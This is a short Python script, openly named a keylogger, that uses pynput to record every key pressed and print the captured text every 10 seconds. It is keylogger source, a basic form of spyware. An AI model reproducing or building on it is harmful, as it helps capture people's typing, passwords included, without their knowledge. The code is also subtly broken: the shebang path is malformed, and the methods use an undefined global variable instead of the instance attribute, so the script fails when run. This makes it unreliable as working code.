#! usr/bin/env python

import pynput.keyboard
import threading


class Keylogger:
    def __init__(self):
        self.log = ""
        self.start()

    def process_keystroke(self, key):
        global log
        try:
            log = log + str(key.char)
        except AttributeError:
            if key == key.space:
                log = log + " "
            else:
                log = log + " " + str(key) + " "

    def report(self):
        global log
        print(log)
        log = ""
        timer = threading.Timer(10, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keystroke)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
